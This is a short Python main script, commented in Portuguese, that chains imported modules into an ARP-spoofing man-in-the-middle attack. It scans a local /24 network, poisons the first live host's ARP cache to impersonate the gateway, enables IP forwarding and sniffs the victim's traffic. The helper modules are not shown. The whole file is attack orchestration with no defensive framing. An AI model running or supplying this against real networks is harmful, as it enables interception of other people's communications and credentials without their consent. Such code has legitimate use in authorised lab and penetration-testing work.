# main.py
from host_scanner import HostScanner
from arp_spoofer import ARPSpoofer
from traffic_monitor import TrafficMonitor

# 1. Escaneando a rede
scanner = HostScanner("192.168.1.0/24")
active_hosts = scanner.scan_network()
print("Hosts ativos:", active_hosts)

# 2. Iniciando o ataque ARP Spoofing em um host ativo
target_ip = active_hosts[0][0]  # Exemplo: usa o IP do primeiro host ativo
spoofer = ARPSpoofer(target_ip, "192.168.1.1")
spoofer.enable_ip_forwarding()
spoofer.start_spoofing()

# 3. Monitorando o tráfego do alvo
monitor = TrafficMonitor()
monitor.start_sniffer()

# Após terminar, pare o spoofing
spoofer.stop_spoofing()
